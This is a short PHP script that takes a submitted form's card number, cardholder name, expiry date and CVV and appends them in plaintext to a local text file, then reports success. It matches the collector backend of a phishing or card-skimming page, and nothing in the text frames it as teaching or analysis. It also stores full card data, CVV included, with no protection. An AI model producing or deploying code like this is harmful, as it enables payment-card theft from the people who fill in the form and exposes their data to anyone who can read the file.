<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = $_POST['card_number'];
    $card_name = $_POST['card_name'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];

    $file = fopen("details.txt", "a");
    fwrite($file, "Card Number: " . $card_number . "\n");
    fwrite($file, "Cardholder Name: " . $card_name . "\n");
    fwrite($file, "Expiry Date: " . $expiry . "\n");
    fwrite($file, "CVV: " . $cvv . "\n");
    fwrite($file, "---------------------------\n");
    fclose($file);

    echo "<h2>Details Saved Successfully!</h2>";
} else {
    echo "Invalid Access!";
}
?>+
